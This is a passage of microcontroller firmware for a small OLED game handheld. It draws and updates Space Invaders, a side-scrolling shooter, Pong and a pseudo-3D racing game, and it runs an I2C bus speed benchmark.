      display.drawLine(invaders.enemyBullets[i].x + shakeX, invaders.enemyBullets[i].y + shakeY,
                      invaders.enemyBullets[i].x + shakeX, invaders.enemyBullets[i].y - 3 + shakeY, SSD1306_WHITE);
    }
  }
  
  // Draw powerups
  for (int i = 0; i < MAX_POWERUPS; i++) {
    if (invaders.powerups[i].active) {
      switch(invaders.powerups[i].type) {
        case 0: // Weapon
          display.drawCircle(invaders.powerups[i].x + shakeX, invaders.powerups[i].y + shakeY, 3, SSD1306_WHITE);
          display.drawPixel(invaders.powerups[i].x + shakeX, invaders.powerups[i].y + shakeY, SSD1306_WHITE);
          break;
        case 1: // Shield
          display.drawCircle(invaders.powerups[i].x + shakeX, invaders.powerups[i].y + shakeY, 3, SSD1306_WHITE);
          break;
        case 2: // Life
          display.fillRect(invaders.powerups[i].x - 2 + shakeX, invaders.powerups[i].y - 2 + shakeY, 4, 4, SSD1306_WHITE);
          break;
      }
    }
  }

  drawParticles();
  
  // Game Over
  if (invaders.gameOver) {
    display.fillRect(10, 20, 108, 30, SSD1306_BLACK);
    display.drawRect(10, 20, 108, 30, SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(30, 25);
    display.print("GAME OVER");
    display.setCursor(25, 38);
    display.print("Score: ");
    display.print(invaders.score);
    if (invaders.score >= highScoreInvaders && invaders.score > 0) {
        display.setCursor(85, 38);
        display.print("NEW!");
    }
  }

  display.display();
}

// ===== I2C BENCHMARK FUNCTIONS =====

bool testI2CConnection(int speed) {
  Wire.setClock(speed);
  // Using endTransmission to check for basic connectivity and bus errors
  // We will try to send a command to the OLED address
  // 0x00 is command stream byte for SSD1306
  Wire.beginTransmission(SCREEN_ADDRESS);
  Wire.write(0x00);
  Wire.write(0xAF); // Display ON command (safe no-op usually if already on)
  return (Wire.endTransmission() == 0);
}

void runI2CBenchmark() {
  benchmarkDone = false;
  display.clearDisplay();
  drawStatusBar();
  display.setCursor(10, 25);
  display.print("Running Benchmark...");
  display.display();

  int speeds[] = {400000, 1000000, 1500000, 2000000, 2500000};
  const char* labels[] = {"400KHz", "1MHz", "1.5MHz", "2MHz", "2.5MHz"};

  recommendedI2C = 400000; // Safe fallback

  for (int i = 0; i < 5; i++) {
      display.fillRect(0, 35, SCREEN_WIDTH, 30, SSD1306_BLACK);
      display.setCursor(10, 35);
      display.print("Testing ");
      display.print(labels[i]);
      display.display();

      delay(200); // Pause before switch

      // Aggressive test: write full frame
      bool passed = true;
      if (!testI2CConnection(speeds[i])) {
          passed = false;
      } else {
          // Stress test by clearing screen 10 times
          Wire.setClock(speeds[i]);
          for(int k=0; k<10; k++) {
             display.clearDisplay();
             display.display(); // This pushes data
             // Note: Adafruit lib doesn't easily expose transmission errors during display(),
             // but if the bus locks up, the ESP usually catches it or it hangs.
             // We rely on endTransmission check above for "is it alive".
             // Visual corruption is subjective and hard to auto-detect without readback.
          }
      }

      if (passed) {
          recommendedI2C = speeds[i];
      } else {
          break; // Stop if we fail
      }
  }

  // Restore safe speed for UI
  Wire.setClock(1000000); // Default reasonable speed
  benchmarkDone = true;
}

void showSystemBenchmark(int x_offset) {
  if (!benchmarkDone) {
     runI2CBenchmark();
  }

  display.clearDisplay();
  drawStatusBar();

  display.setTextSize(1);
  display.setCursor(x_offset + 20, 5);
  display.print("I2C BENCHMARK");
  display.drawLine(x_offset, 15, x_offset + SCREEN_WIDTH, 15, SSD1306_WHITE);

  display.setCursor(x_offset + 5, 25);
  display.print("Max Stable Speed:");

  display.setCursor(x_offset + 5, 38);
  display.setTextSize(2);
  display.print(recommendedI2C / 1000);
  display.print(" kHz");
  display.setTextSize(1);

  display.setCursor(x_offset + 5, 56);
  if (recommendedI2C == currentI2C) {
      display.print("Current Setting [OK]");
  } else {
      display.print("Press SEL to Apply");
  }
  
  display.display();
}

void handleSpaceInvadersInput() {
  if (invaders.gameOver) return;
  float speed = 120.0f; // pixels per second

  if (digitalRead(BTN_LEFT) == LOW) {
    invaders.playerX -= speed * deltaTime;
  }
  if (digitalRead(BTN_RIGHT) == LOW) {
    invaders.playerX += speed * deltaTime;
  }

  // Clamp
  if (invaders.playerX < 0) invaders.playerX = 0;
  if (invaders.playerX > SCREEN_WIDTH - invaders.playerWidth) invaders.playerX = SCREEN_WIDTH - invaders.playerWidth;

  // Auto-fire if holding touch button
  if (digitalRead(TOUCH_LEFT) == HIGH) {
     handleSelect(); // Re-use select logic for shooting
  }
}

// ========== SIDE SCROLLER SHOOTER GAME ==========

void initSideScroller() {
  scroller.playerX = 20;
  scroller.playerY = SCREEN_HEIGHT / 2;
  scroller.playerWidth = 8;
  scroller.playerHeight = 6;
  scroller.lives = 3;
  scroller.score = 0;
  scroller.level = 1;
  scroller.gameOver = false;
  scroller.weaponLevel = 1;
  scroller.specialCharge = 0;
  scroller.shieldActive = false;
  scroller.lastMove = 0;
  scroller.lastShoot = 0;
  scroller.lastEnemySpawn = 0;
  scroller.lastObstacleSpawn = 0;
  scroller.scrollOffset = 0;
  
  // Clear everything
  for (int i = 0; i < MAX_OBSTACLES; i++) {
    scroller.obstacles[i].active = false;
    scroller.enemyBullets[i].active = false;
  }
  for (int i = 0; i < MAX_SCROLLER_BULLETS; i++) {
    scroller.bullets[i].active = false;
  }
  for (int i = 0; i < MAX_SCROLLER_ENEMIES; i++) {
    scroller.enemies[i].active = false;
  }
}

void updateSideScroller() {
  if (scroller.gameOver) return;
  
  unsigned long now = millis();
  
  updateParticles();
  if (screenShake > 0) screenShake--;

  scroller.scrollOffset += 60.0f * deltaTime;
  if (scroller.scrollOffset > SCREEN_WIDTH) scroller.scrollOffset = 0;
  
  // Spawn obstacles (More varied speed)
  if (now - scroller.lastObstacleSpawn > 2000) {
    for (int i = 0; i < MAX_OBSTACLES; i++) {
      if (!scroller.obstacles[i].active) {
        scroller.obstacles[i].x = SCREEN_WIDTH;
        scroller.obstacles[i].y = random(15, SCREEN_HEIGHT - 20);
        scroller.obstacles[i].width = 8;
        scroller.obstacles[i].height = 12;
        scroller.obstacles[i].scrollSpeed = 1.0 + (random(0, 10) / 5.0); // 1.0 to 3.0
        scroller.obstacles[i].active = true;
        break;
      }
    }
    scroller.lastObstacleSpawn = now;
  }
  
  // Spawn enemies
  if (now - scroller.lastEnemySpawn > 1500) {
    for (int i = 0; i < MAX_SCROLLER_ENEMIES; i++) {
      if (!scroller.enemies[i].active) {
        scroller.enemies[i].x = SCREEN_WIDTH;
        scroller.enemies[i].y = random(15, SCREEN_HEIGHT - 15);
        scroller.enemies[i].width = 8;
        scroller.enemies[i].height = 8;
        scroller.enemies[i].type = random(0, 3);
        scroller.enemies[i].health = scroller.enemies[i].type + 2;
        scroller.enemies[i].dirY = random(-1, 2);
        scroller.enemies[i].active = true;
        break;
      }
    }
    scroller.lastEnemySpawn = now;
  }
  
  // Move obstacles
  for (int i = 0; i < MAX_OBSTACLES; i++) {
    if (scroller.obstacles[i].active) {
      scroller.obstacles[i].x -= scroller.obstacles[i].scrollSpeed * 60.0f * deltaTime;
      if (scroller.obstacles[i].x < -scroller.obstacles[i].width) {
        scroller.obstacles[i].active = false;
      }
    }
  }
  
  // Move and update enemies
  float enemyBaseSpeed = 50.0f;
  for (int i = 0; i < MAX_SCROLLER_ENEMIES; i++) {
    if (scroller.enemies[i].active) {
      scroller.enemies[i].x -= enemyBaseSpeed * deltaTime;
      scroller.enemies[i].y += scroller.enemies[i].dirY * (enemyBaseSpeed / 2.0f) * deltaTime;
      
      // Bounce off edges
      if (scroller.enemies[i].y < 12) {
        scroller.enemies[i].y = 12;
        scroller.enemies[i].dirY = 1;
      }
      if (scroller.enemies[i].y > SCREEN_HEIGHT - 8) {
        scroller.enemies[i].y = SCREEN_HEIGHT - 8;
        scroller.enemies[i].dirY = -1;
      }
      
      // Enemy shooting
      if (scroller.enemies[i].type == 1 && random(0, 50) == 0) {
        for (int j = 0; j < MAX_OBSTACLES; j++) {
          if (!scroller.enemyBullets[j].active) {
            scroller.enemyBullets[j].x = scroller.enemies[i].x;
            scroller.enemyBullets[j].y = scroller.enemies[i].y + 4;
            scroller.enemyBullets[j].active = true;
            break;
          }
        }
      }
      
      if (scroller.enemies[i].x < -8) {
        scroller.enemies[i].active = false;
      }
    }
  }
  
  // Move bullets
  float playerBulletSpeed = 200.0f;
  for (int i = 0; i < MAX_SCROLLER_BULLETS; i++) {
    if (scroller.bullets[i].active) {
      scroller.bullets[i].x += scroller.bullets[i].dirX * playerBulletSpeed * deltaTime;
      scroller.bullets[i].y += scroller.bullets[i].dirY * playerBulletSpeed * deltaTime;
      
      if (scroller.bullets[i].x < 0 || scroller.bullets[i].x > SCREEN_WIDTH ||
          scroller.bullets[i].y < 12 || scroller.bullets[i].y > SCREEN_HEIGHT) {
        scroller.bullets[i].active = false;
      }
    }
  }
  
  float enemyBulletSpeed = 120.0f;
  for (int i = 0; i < MAX_OBSTACLES; i++) {
    if (scroller.enemyBullets[i].active) {
      scroller.enemyBullets[i].x -= enemyBulletSpeed * deltaTime;
      if (scroller.enemyBullets[i].x < 0) {
        scroller.enemyBullets[i].active = false;
      }
    }
  }
  
  // Collision - player bullets vs enemies
  for (int i = 0; i < MAX_SCROLLER_BULLETS; i++) {
    if (scroller.bullets[i].active) {
      for (int j = 0; j < MAX_SCROLLER_ENEMIES; j++) {
        if (scroller.enemies[j].active) {
          if (abs(scroller.bullets[i].x - scroller.enemies[j].x) < 8 &&
              abs(scroller.bullets[i].y - scroller.enemies[j].y) < 8) {
            
            scroller.bullets[i].active = false;
            scroller.enemies[j].health -= scroller.bullets[i].damage;
            
            if (scroller.enemies[j].health <= 0) {
              scroller.enemies[j].active = false;
              spawnExplosion(scroller.enemies[j].x + 4, scroller.enemies[j].y + 4, 6);
              screenShake = 2;
              scroller.score += (scroller.enemies[j].type + 1) * 15;
              scroller.specialCharge = min(scroller.specialCharge + 10, 100);
            }
            break;
          }
        }
      }
      
      // Bullets vs obstacles
      for (int j = 0; j < MAX_OBSTACLES; j++) {
        if (scroller.obstacles[j].active) {
          if (abs(scroller.bullets[i].x - scroller.obstacles[j].x) < 8 &&
              abs(scroller.bullets[i].y - scroller.obstacles[j].y) < 8) {
            scroller.bullets[i].active = false;
            break;
          }
        }
      }
    }
  }
  
  // Collision - player vs obstacles
  for (int i = 0; i < MAX_OBSTACLES; i++) {
    if (scroller.obstacles[i].active) {
      if (abs(scroller.playerX - scroller.obstacles[i].x) < 8 &&
          abs(scroller.playerY - scroller.obstacles[i].y) < 8) {
        if (!scroller.shieldActive) {
          scroller.lives--;
          screenShake = 6;
          if (scroller.lives <= 0) {
            scroller.gameOver = true;
            if (scroller.score > highScoreScroller) {
                highScoreScroller = scroller.score;
                savePreferenceInt("hs_scroller", highScoreScroller);
            }
          }
        }
        scroller.obstacles[i].active = false;
      }
    }
  }
  
  // Collision - player vs enemies
  for (int i = 0; i < MAX_SCROLLER_ENEMIES; i++) {
    if (scroller.enemies[i].active) {
      if (abs(scroller.playerX - scroller.enemies[i].x) < 8 &&
          abs(scroller.playerY - scroller.enemies[i].y) < 8) {
        if (!scroller.shieldActive) {
          scroller.lives--;
          screenShake = 6;
          if (scroller.lives <= 0) {
            scroller.gameOver = true;
            if (scroller.score > highScoreScroller) {
                highScoreScroller = scroller.score;
                savePreferenceInt("hs_scroller", highScoreScroller);
            }
          }
        }
        scroller.enemies[i].active = false;
      }
    }
  }
  
  // Collision - enemy bullets vs player
  for (int i = 0; i < MAX_OBSTACLES; i++) {
    if (scroller.enemyBullets[i].active) {
      if (abs(scroller.enemyBullets[i].x - scroller.playerX) < 6 &&
          abs(scroller.enemyBullets[i].y - scroller.playerY) < 6) {
        if (!scroller.shieldActive) {
          scroller.lives--;
          screenShake = 6;
          if (scroller.lives <= 0) {
            scroller.gameOver = true;
            if (scroller.score > highScoreScroller) {
                highScoreScroller = scroller.score;
                savePreferenceInt("hs_scroller", highScoreScroller);
            }
          }
        }
        scroller.enemyBullets[i].active = false;
      }
    }
  }
}

void drawSideScroller() {
  display.clearDisplay();

  int shakeX = 0;
  int shakeY = 0;
  if (screenShake > 0) {
    shakeX = random(-screenShake, screenShake + 1);
    shakeY = random(-screenShake, screenShake + 1);
  }

  drawStatusBar();
  
  // Draw HUD
  display.setTextSize(1);
  display.setCursor(2, 2);
  display.print("L:");
  display.print(scroller.lives);
  display.setCursor(30, 2);
  display.print(scroller.score);
  display.setCursor(65, 2);
  display.print("HI:");
  display.print(highScoreScroller);

  display.setCursor(100, 2);
  display.print("SP:");
  display.print(scroller.specialCharge);
  
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  
  // Draw scrolling background (Parallax)
  for (int i = 0; i < SCREEN_WIDTH; i += 16) {
    int x = (i + scroller.scrollOffset) % SCREEN_WIDTH;
    display.drawPixel(x, 12 + random(0, 3), SSD1306_WHITE);
    display.drawPixel(x, SCREEN_HEIGHT - 2 - random(0, 3), SSD1306_WHITE);
  }
  
  // Draw player (Neon Style)
  if (scroller.shieldActive && (millis() / 100) % 2 == 0) {
    display.drawCircle(scroller.playerX + shakeX, scroller.playerY + shakeY, 7, SSD1306_WHITE);
  }
  
  // Player ship design
  display.drawTriangle(
    scroller.playerX + 4 + shakeX, scroller.playerY + shakeY,
    scroller.playerX - 4 + shakeX, scroller.playerY - 3 + shakeY,
    scroller.playerX - 4 + shakeX, scroller.playerY + 3 + shakeY,
    SSD1306_WHITE
  );
  
  // Draw obstacles (as asteroids)
  for (int i = 0; i < MAX_OBSTACLES; i++) {
    if (scroller.obstacles[i].active) {
      display.drawCircle(scroller.obstacles[i].x + shakeX, scroller.obstacles[i].y + shakeY, 5, SSD1306_WHITE);
      display.drawPixel(scroller.obstacles[i].x + shakeX + 2, scroller.obstacles[i].y + shakeY - 2, SSD1306_WHITE);
    }
  }
  
  // Draw enemies (Neon Style)
  for (int i = 0; i < MAX_SCROLLER_ENEMIES; i++) {
    if (scroller.enemies[i].active) {
      switch(scroller.enemies[i].type) {
        case 0: // Basic
          display.drawCircle(scroller.enemies[i].x + shakeX, scroller.enemies[i].y + shakeY, 4, SSD1306_WHITE);
          break;
        case 1: // Shooter
          display.drawRect(scroller.enemies[i].x - 4 + shakeX, scroller.enemies[i].y - 4 + shakeY, 8, 8, SSD1306_WHITE);
          break;
        case 2: // Kamikaze
          display.drawTriangle(
            scroller.enemies[i].x - 6 + shakeX, scroller.enemies[i].y + shakeY,
            scroller.enemies[i].x + 2 + shakeX, scroller.enemies[i].y - 4 + shakeY,
            scroller.enemies[i].x + 2 + shakeX, scroller.enemies[i].y + 4 + shakeY,
            SSD1306_WHITE
          );
          break;
      }
    }
  }
  
  // Draw bullets (Neon Style)
  for (int i = 0; i < MAX_SCROLLER_BULLETS; i++) {
    if (scroller.bullets[i].active) {
      display.drawLine(scroller.bullets[i].x + shakeX, scroller.bullets[i].y + shakeY,
                       scroller.bullets[i].x + shakeX - 3, scroller.bullets[i].y + shakeY,
                       SSD1306_WHITE);
    }
  }
  
  for (int i = 0; i < MAX_OBSTACLES; i++) {
    if (scroller.enemyBullets[i].active) {
      display.drawLine(scroller.enemyBullets[i].x + shakeX, scroller.enemyBullets[i].y + shakeY,
                       scroller.enemyBullets[i].x + shakeX + 2, scroller.enemyBullets[i].y + shakeY,
                       SSD1306_WHITE);
    }
  }

  drawParticles();
  
  // Game Over
  if (scroller.gameOver) {
    display.fillRect(10, 20, 108, 30, SSD1306_BLACK);
    display.drawRect(10, 20, 108, 30, SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(30, 25);
    display.print("GAME OVER");
    display.setCursor(25, 38);
    display.print("Score: ");
    display.print(scroller.score);
    if (scroller.score >= highScoreScroller && scroller.score > 0) {
        display.setCursor(85, 38);
        display.print("NEW!");
    }
  }
  
  display.display();
}

void handleSideScrollerInput() {
  if (scroller.gameOver) return;
  float speed = 110.0f; // pixels per second

  if (digitalRead(BTN_LEFT) == LOW) scroller.playerX -= speed * deltaTime;
  if (digitalRead(BTN_RIGHT) == LOW) scroller.playerX += speed * deltaTime;
  if (digitalRead(BTN_UP) == LOW) scroller.playerY -= speed * deltaTime;
  if (digitalRead(BTN_DOWN) == LOW) scroller.playerY += speed * deltaTime;

  // Clamp
  if (scroller.playerX < 0) scroller.playerX = 0;
  if (scroller.playerX > SCREEN_WIDTH - scroller.playerWidth) scroller.playerX = SCREEN_WIDTH - scroller.playerWidth;
  if (scroller.playerY < 12) scroller.playerY = 12;
  if (scroller.playerY > SCREEN_HEIGHT - scroller.playerHeight) scroller.playerY = SCREEN_HEIGHT - scroller.playerHeight;

  // Auto-fire
  if (digitalRead(TOUCH_LEFT) == HIGH) {
     handleSelect();
  }
}

// ========== PONG GAME ==========

void initPong() {
  pong.ballX = SCREEN_WIDTH / 2;
  pong.ballY = SCREEN_HEIGHT / 2;
  pong.ballDirX = random(0, 2) == 0 ? -1 : 1;
  pong.ballDirY = random(0, 2) == 0 ? -1 : 1;
  pong.ballSpeed = 2;
  pong.paddle1Y = SCREEN_HEIGHT / 2 - 10;
  pong.paddle2Y = SCREEN_HEIGHT / 2 - 10;
  pong.paddleWidth = 4;
  pong.paddleHeight = 20;
  pong.score1 = 0;
  pong.score2 = 0;
  pong.gameOver = false;
  pong.aiMode = true;
  pong.difficulty = 2;

  for(int i=0; i<5; i++) {
    pong.trailX[i] = pong.ballX;
    pong.trailY[i] = pong.ballY;
  }
}

void updatePong() {
  if (pong.gameOver) return;

  updateParticles();
  if (screenShake > 0) screenShake--;
  
  // Move ball
  if (!pongResetting) {
    float effectiveSpeed = pong.ballSpeed * 60.0f; // Base speed at 60fps

    // Update trails
    for(int i=4; i>0; i--) {
      pong.trailX[i] = pong.trailX[i-1];
      pong.trailY[i] = pong.trailY[i-1];
    }
    pong.trailX[0] = pong.ballX;
    pong.trailY[0] = pong.ballY;

    pong.ballX += pong.ballDirX * effectiveSpeed * deltaTime;
    pong.ballY += pong.ballDirY * effectiveSpeed * deltaTime;
  }
  
  // Ball collision with top/bottom
  if (pong.ballY <= 12) {
    pong.ballY = 12;
    pong.ballDirY *= -1;
  }
  if (pong.ballY >= SCREEN_HEIGHT - 2) {
    pong.ballY = SCREEN_HEIGHT - 2;
    pong.ballDirY *= -1;
  }
  
  // Ball collision with paddles
  // Left paddle
  if (pong.ballX <= 6 && pong.ballX >= 2) {
    if (pong.ballY >= pong.paddle1Y - 2 && pong.ballY <= pong.paddle1Y + pong.paddleHeight + 2) {
      pong.ballDirX = 1;
      pong.ballSpeed = min(pong.ballSpeed + 0.2f, 5.0f); // Accelerate
      spawnExplosion(pong.ballX, pong.ballY, 5);

      // Add spin based on where it hit the paddle
      float hitPos = pong.ballY - (pong.paddle1Y + pong.paddleHeight / 2.0);
      pong.ballDirY = hitPos / (pong.paddleHeight / 2.0); // -1.0 to 1.0

      ledQuickFlash();
    }
  }
  
  // Right paddle
  if (pong.ballX >= SCREEN_WIDTH - 6 && pong.ballX <= SCREEN_WIDTH - 2) {
    if (pong.ballY >= pong.paddle2Y - 2 && pong.ballY <= pong.paddle2Y + pong.paddleHeight + 2) {
      pong.ballDirX = -1;
      pong.ballSpeed = min(pong.ballSpeed + 0.2f, 5.0f); // Accelerate
      spawnExplosion(pong.ballX, pong.ballY, 5);

      float hitPos = pong.ballY - (pong.paddle2Y + pong.paddleHeight / 2.0);
      pong.ballDirY = hitPos / (pong.paddleHeight / 2.0);

      ledQuickFlash();
    }
  }
  
  // Scoring
  if (!pongResetting) {
    if (pong.ballX < 0) {
      pong.score2++;
      pongResetting = true;
      pongResetTimer = millis();
      if (pong.score2 >= 10) pong.gameOver = true;
    }
    
    if (pong.ballX > SCREEN_WIDTH) {
      pong.score1++;
      pongResetting = true;
      pongResetTimer = millis();
      if (pong.score1 >= 10) pong.gameOver = true;
    }
  } else {
    if (millis() - pongResetTimer > 500) {
      pongResetting = false;
      pong.ballX = SCREEN_WIDTH / 2;
      pong.ballY = SCREEN_HEIGHT / 2;
      pong.ballDirX = (pong.score1 > pong.score2) ? -1 : 1;
      pong.ballSpeed = 2.0f;
    }
  }
  
  // AI for right paddle
  if (pong.aiMode) {
    float targetY = pong.ballY - pong.paddleHeight / 2.0;
    float diff = targetY - pong.paddle2Y;
    
    // AI difficulty (float speed)
    float aiSpeed = pong.difficulty * 45.0f; // pixels per second
    if (abs(diff) > 1.0) { // Add a small deadzone
      if (diff > 0) pong.paddle2Y += min(aiSpeed * deltaTime, diff);
      else pong.paddle2Y += max(-aiSpeed * deltaTime, diff);
    }
  }
  
  // Clamp paddles
  pong.paddle1Y = constrain(pong.paddle1Y, 12, SCREEN_HEIGHT - pong.paddleHeight);
  pong.paddle2Y = constrain(pong.paddle2Y, 12, SCREEN_HEIGHT - pong.paddleHeight);
}

void drawPong() {
  display.clearDisplay();
  drawStatusBar();
  
  int shakeX = 0;
  int shakeY = 0;
  if (screenShake > 0) {
    shakeX = random(-screenShake, screenShake + 1);
    shakeY = random(-screenShake, screenShake + 1);
  }

  // Draw score
  display.setTextSize(1);
  display.setCursor(30, 2);
  display.print(pong.score1);
  display.setCursor(SCREEN_WIDTH - 40, 2);
  display.print(pong.score2);
  
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  
  // Draw center line
  for (int y = 12; y < SCREEN_HEIGHT; y += 4) {
    display.drawPixel(SCREEN_WIDTH / 2, y, SSD1306_WHITE);
  }
  
  // Draw paddles (Neon Style)
  display.drawRect(2, pong.paddle1Y + shakeY, pong.paddleWidth, pong.paddleHeight, SSD1306_WHITE);
  display.drawRect(SCREEN_WIDTH - 6, pong.paddle2Y + shakeY, pong.paddleWidth, pong.paddleHeight, SSD1306_WHITE);
  
  // Draw ball trails
  for(int i=0; i<5; i++) {
    if((int)pong.trailX[i] != 0)
      display.drawPixel(pong.trailX[i] + shakeX, pong.trailY[i] + shakeY, SSD1306_WHITE);
  }

  // Draw ball (Neon Style with pulse)
  float ballPulse = abs(sin(millis() / 150.0f)); // 0.0 to 1.0
  display.drawCircle(pong.ballX + shakeX, pong.ballY + shakeY, 2 + ballPulse, SSD1306_WHITE);

  drawParticles();
  
  // Game Over
  if (pong.gameOver) {
    display.fillRect(20, 25, 88, 20, SSD1306_BLACK);
    display.drawRect(20, 25, 88, 20, SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(30, 30);
    if (pong.score1 >= 10) {
      display.print("PLAYER 1 WINS!");
    } else {
      display.print("PLAYER 2 WINS!");
    }
  }
  
  display.display();
}

void handlePongInput() {
  if (pong.gameOver) return;
  float speed = 130.0f; // pixels per second

  if (digitalRead(BTN_UP) == LOW) pong.paddle1Y -= speed * deltaTime;
  if (digitalRead(BTN_DOWN) == LOW) pong.paddle1Y += speed * deltaTime;

  // Clamp
  if (pong.paddle1Y < 12) pong.paddle1Y = 12;
  if (pong.paddle1Y > SCREEN_HEIGHT - pong.paddleHeight) pong.paddle1Y = SCREEN_HEIGHT - pong.paddleHeight;
}

// ========== TURBO RACING GAME ==========

void initRacing(int mode) {
  racing.carX = 0;
  racing.speed = 0;
  racing.rpm = 0;
  racing.gear = 1;
  racing.clutchPressed = false;
  racing.roadCurvature = 0;
  racing.trackPosition = 0;
  racing.score = 0;
  racing.lives = 3;
  racing.mode = mode;
  racing.gameOver = false;
  racing.bgOffset = 0;
  racing.camHeight = 0;

  // Generate track curves and hills
  for(int i=0; i<100; i++) {
    // Curves
    racing.roadCurves[i] = sin(i * 0.1) * random(20, 60) * 0.01f;
    // Hills - Smooth rolling hills
    racing.roadHeight[i] = sin(i * 0.2) * 500.0f; // Scale height effect
  }

  // Init enemies
  for(int i=0; i<5; i++) {
    racing.enemies[i].active = false;
  }

  // Init scenery
  for(int i=0; i<10; i++) {
    racing.scenery[i].active = false;
  }
}

void updateRacing() {
  if (racing.gameOver) return;

  updateParticles();
  if (screenShake > 0) screenShake--;

  // Physics
  float maxSpeed = 100.0f + (racing.gear * 30.0f);
  float acceleration = (racing.rpm / 8000.0f) * 100.0f * deltaTime;
  float friction = 20.0f * deltaTime;

  // Engine
  if (racing.clutchPressed) {
    // Engine disconnects
    if (digitalRead(BTN_UP) == LOW || digitalRead(TOUCH_RIGHT) == HIGH) {
      racing.rpm += 5000.0f * deltaTime; // Rev fast
    } else {
      racing.rpm -= 3000.0f * deltaTime;
    }
    // Car coasts
    racing.speed -= friction * 0.5f;
  } else {
    // Engine connected
    if (digitalRead(BTN_UP) == LOW || digitalRead(TOUCH_RIGHT) == HIGH) {
       racing.rpm += 2000.0f * deltaTime;
       racing.speed += acceleration;
    } else {
       racing.rpm -= 2000.0f * deltaTime;
       racing.speed -= friction;
    }

    // Engine Braking / RPM Matching
    float targetRPM = (racing.speed / maxSpeed) * 8000.0f;
    // Simple blend for RPM matching
    racing.rpm = (racing.rpm * 0.9f) + (targetRPM * 0.1f);
  }

  // Brake
  if (digitalRead(BTN_DOWN) == LOW || digitalRead(TOUCH_LEFT) == HIGH) {
    racing.speed -= 100.0f * deltaTime;
  }

  // Clamp values
  if (racing.rpm > 9000) racing.rpm = 9000; // Redline
  if (racing.rpm < 800) racing.rpm = 800;   // Idle
  if (racing.speed < 0) racing.speed = 0;

  // Steering
  if (racing.speed > 0.5f) {
    // Increased steering sensitivity for snappier response
    float steerSense = 2.5f + (racing.speed / 40.0f);
    if (digitalRead(BTN_LEFT) == LOW) racing.carX -= steerSense * deltaTime;
    if (digitalRead(BTN_RIGHT) == LOW) racing.carX += steerSense * deltaTime;
  }

  // Track movement
  racing.trackPosition += racing.speed * deltaTime;
  int segIndex = ((int)(racing.trackPosition / 100.0f)) % 100;
  racing.roadCurvature = racing.roadCurves[segIndex];

  // Hill Physics (Gravity)
  // Calculate slope: height difference between next segment and current segment
  int nextSegIndex = (segIndex + 1) % 100;
  float segmentSlope = (racing.roadHeight[nextSegIndex] - racing.roadHeight[segIndex]);
  // Apply gravity based on slope
  racing.speed -= segmentSlope * 0.05f * deltaTime;

  // Smooth Camera Height
  // Camera follows the road height but with some damping/spring
  float targetCamHeight = racing.roadHeight[segIndex] + 150.0f; // +150 for "eye level"
  racing.camHeight += (targetCamHeight - racing.camHeight) * 5.0f * deltaTime;

  // Update Background Parallax
  racing.bgOffset += racing.roadCurvature * (racing.speed / 200.0f) * deltaTime * 10.0f;
  if (racing.bgOffset > SCREEN_WIDTH) racing.bgOffset -= SCREEN_WIDTH;
  if (racing.bgOffset < 0) racing.bgOffset += SCREEN_WIDTH;

  // Auto-centering force on curve
  racing.carX -= racing.roadCurvature * (racing.speed / 100.0f) * deltaTime;

  // Crash off road
  if (abs(racing.carX) > 1.4f) {
    racing.speed -= 40.0f * deltaTime; // Linear slowdown
    if (racing.speed < 10.0f && (digitalRead(BTN_UP) == LOW || digitalRead(TOUCH_RIGHT) == HIGH)) {
        racing.speed = 10.0f; // Minimum crawl speed if gas pressed
    } else if (racing.speed < 0) {
        racing.speed = 0;
    }

    screenShake = 2;
    if (racing.speed > 50) spawnExplosion(SCREEN_WIDTH/2 + (racing.carX * 20), SCREEN_HEIGHT-10, 1);
  }

  racing.score += (int)(racing.speed * deltaTime);

  // Spawn Scenery
  if (racing.speed > 10.0f && random(0, 100) < 5) {
      for(int i=0; i<10; i++) {
         if(!racing.scenery[i].active) {
             racing.scenery[i].active = true;
             racing.scenery[i].z = 200; // Far away
             racing.scenery[i].side = (random(0,2) == 0) ? -1.0f : 1.0f; // Left or Right
             racing.scenery[i].type = random(0, 2); // Tree or Light
             break;
         }
      }
  }

  // Update Scenery
  for(int i=0; i<10; i++) {
      if (racing.scenery[i].active) {
          racing.scenery[i].z -= racing.speed * deltaTime; // Scenery moves at full speed
          if (racing.scenery[i].z < 1.0f) racing.scenery[i].active = false;
      }
  }

  // Enemies (Only in Challenge Mode)
  if (racing.mode == RACING_MODE_CHALLENGE) {
      if (random(0, 100) < 2) {
          for(int i=0; i<5; i++) {
            if (!racing.enemies[i].active) {
                racing.enemies[i].active = true;
                racing.enemies[i].z = 200; // Far away
                racing.enemies[i].x = random(-50, 50) / 100.0f;
                racing.enemies[i].speed = racing.speed * 0.5f; // Slower traffic
                break;
            }
          }
      }
  }

  for(int i=0; i<5; i++) {
      if (racing.enemies[i].active) {
          racing.enemies[i].z -= (racing.speed - racing.enemies[i].speed) * deltaTime;

          if (racing.enemies[i].z < 1.0f) {
              racing.enemies[i].active = false;
          }

          // Collision
          if (racing.enemies[i].z < 10.0f && racing.enemies[i].z > 0.0f) {
             if (abs(racing.carX - racing.enemies[i].x) < 0.3f) {
                 if (racing.mode == RACING_MODE_CHALLENGE) {
                     racing.lives--;
                     if (racing.lives <= 0) {
                         racing.speed = 0;
                         racing.rpm = 0;
                         racing.gameOver = true;
                         if (racing.score > highScoreRacing) {
                             highScoreRacing = racing.score;
                             savePreferenceInt("hs_racing", highScoreRacing);
                         }
                     } else {
                         racing.speed *= 0.5f;
                     }
                 } else {
                     // Free Drive: Just slow down
                     racing.speed *= 0.7f;
                 }

                 screenShake = 20;
                 spawnExplosion(SCREEN_WIDTH/2, SCREEN_HEIGHT/2, 20);
                 racing.enemies[i].active = false;
             }
          }
      }
  }
}

void drawRacing() {
  display.clearDisplay();
  drawStatusBar();

  // Horizon
  int horizonY = 25;

  // Draw Scrolling Mountain Background
  int bgX = ((int)racing.bgOffset) % 32;
  for(int x = -bgX; x < SCREEN_WIDTH; x += 32) {
      // Simple mountain shapes
      display.drawLine(x, horizonY, x + 16, horizonY - 10, SSD1306_WHITE);
      display.drawLine(x + 16, horizonY - 10, x + 32, horizonY, SSD1306_WHITE);
  }

  // Draw Road (Pseudo 3D with Hills)
  int roadWidth = 200; // Wider road for hill effect
  int centerX = SCREEN_WIDTH / 2;

  // Track previous segment screen Y to handle occlusion (Painter's algorithm back-to-front)
